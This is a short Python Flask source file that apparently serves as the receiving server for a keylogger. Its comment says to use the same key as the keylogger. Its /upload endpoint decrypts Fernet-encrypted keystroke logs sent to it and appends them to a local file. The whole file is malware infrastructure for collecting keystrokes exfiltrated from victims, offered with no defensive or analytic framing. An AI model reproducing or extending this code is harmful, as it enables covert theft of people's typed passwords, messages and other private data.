from flask import Flask, request
from cryptography.fernet import Fernet
import datetime

app = Flask(__name__)

# Use the same key as the keylogger - yes go to your key.key  
with open("key.key", "rb") as f:
    key=f.read()
fernet = Fernet(key)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.data
    try:
        decrypted = fernet.decrypt(data).decode()
        print(f"[{datetime.datetime.now()}] Log received:\n{decrypted}")
        with open("received_logs.txt", "a") as f:
            f.write(f"{decrypted}\n")
        return "Success", 200
    except Exception as e:
        print("Decryption failed:", e)
        return "Error", 400

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
